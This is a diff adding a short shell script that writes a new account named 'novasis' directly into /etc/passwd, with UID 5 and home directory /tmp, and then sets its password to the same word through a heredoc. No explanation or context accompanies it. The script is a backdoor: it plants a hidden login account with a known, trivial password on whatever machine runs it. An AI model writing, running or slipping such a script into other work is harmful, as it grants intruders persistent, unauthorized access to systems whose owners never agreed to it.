@@ -1,0 +1,8 @@
+#!/bin/sh
+echo "novasis:x:5:5:novasis:/tmp:/bin/sh" >> /etc/passwd
+/usr/bin/passwd novasis <<EOF
+novasis
+novasis
+EOF
+
+
